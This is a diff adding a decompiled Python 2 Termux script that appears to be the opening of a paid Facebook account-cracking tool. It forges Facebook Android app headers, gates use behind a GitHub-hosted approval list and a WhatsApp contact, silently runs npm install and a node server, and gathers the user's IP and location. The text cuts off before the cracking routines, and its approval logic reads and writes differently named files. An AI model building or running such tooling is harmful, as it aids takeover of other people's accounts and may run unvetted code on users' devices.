@@ -1,0 +1,121 @@
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
+# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
+# Embedded file name: dg
+
+import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+__author__ = 'Mr Adi'
+__copyright = 'All rights reserved . Copyright  Mr Adi'
+os.system('termux-setup-storage')
+try:
+    os.mkdir('/sdcard/ids')
+except OSError:
+    pass
+
+bd = random.randint(20000000.0, 30000000.0)
+sim = random.randint(20000, 40000)
+header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 
+   'x-fb-connection-quality': 'EXCELLENT', 
+   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
+   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
+   'content-type': 'application/x-www-form-urlencoded', 
+   'x-fb-http-engine': 'Liger'}
+os.system('git pull')
+os.system('clear')
+
+#### colours ####
+B='\033[1;94m'
+R='\033[1;91m'
+G='\033[1;92m'
+W='\033[1;97m'
+S='\033[1;96m'
+P='\033[1;95m'
+Y='\033[1;93m'
+
+logo = '\n\x1b[1;94m \n\x1b[1;92m Mr Adi                                 \n     \x1b[31;1m[\x1b[43;1m This tool is Paid \x1b[00;1m\x1b[31;1m ]\n\n     \x1b[32;1mCreator \x1b[37;1m: \x1b[33;1mMr Adi\n     \x1b[32;1mFB ID   \x1b[37;1m: \x1b[33;1mMr Adi\n'
+
+def reg():
+    os.system('clear')
+    print logo
+    print ''
+    print '\x1b[1;32;1m Welcome To My Tool'
+    print ''
+    time.sleep(1)
+    try:
+        to = open('/sdcard/.mrp.txt', 'r').read()
+    except (KeyError, IOError):
+        reg2()
+
+    r = requests.get('https://raw.githubusercontent.com/mrpardesi007/Crackeradi/main/server.txt').text
+    if to in r:
+        os.system('cd ..... && npm install')
+        os.system('fuser -k 5000/tcp &')
+        os.system('#')
+        os.system('cd ..... && node index.js &')
+        time.sleep(5)
+        ip()
+    else:
+        os.system('clear')
+        print logo
+        print '\tApproved Failed'
+        print ' \x1b[1;92mYour Id Is Not Approved Already '
+        print ' \x1b[1;97mCopy the id and send to Owner'
+        print ' \x1b[1;96mYour id: ' + to
+        raw_input('\x1b[1;93m Press enter to send id')
+        os.system('xdg-open https://wa.me/+994402852581')
+        reg()
+
+
+def reg2():
+    os.system('clear')
+    print logo
+    print '\tApproval not detected'
+    print ' \x1b[1;92mCopy and press enter , then select Whatsapp to continue'
+    id = uuid.uuid4().hex[:50]
+    print ' Your id: ' + id
+    print ''
+    raw_input(' Press enter to go to WhatsApp ')
+    os.system('xdg-open https://wa.me/+994402852581')
+    sav = open('/sdcard/Mrp.txt', 'w')
+    sav.write(id)
+    sav.close()
+    raw_input('\x1b[1;92m Press enter to check Approval ')
+    reg()
+
+
+def ip():
+    os.system('clear')
+    print logo
+    print '\tcollecting device info'
+    try:
+        ipinfo = requests.get('http://ip-api.com/json/')
+        z = json.loads(ipinfo.text)
+        ips = z['query']
+        country = z['country']
+        regi = z['regionName']
+        network = z['isp']
+    except:
+        pass
+
+    print '\x1b[1;92m Your ip: ' + ips
+    time.sleep(1)
+    print '\x1b[1;93m Your country: ' + country
+    time.sleep(1)
+    print '\x1b[1;96m Your region: ' + regi
+    time.sleep(1)
+    print ' \x1b[1;95mYour network: ' + network
+    time.sleep(1)
+    print ' Loading ...'
+    time.sleep(1)
+    log_menu()
+
+logo = """
+
+\033[1;97m*************************************************
+\033[1;94m  __  __                          _   _ 
+\033[1;91m |  \/  |             /\         | | (_)
+\033[1;92m | \  / |  _ __      /  \      __| |  _ 
+\033[1;97m | |\/| | | '__| 
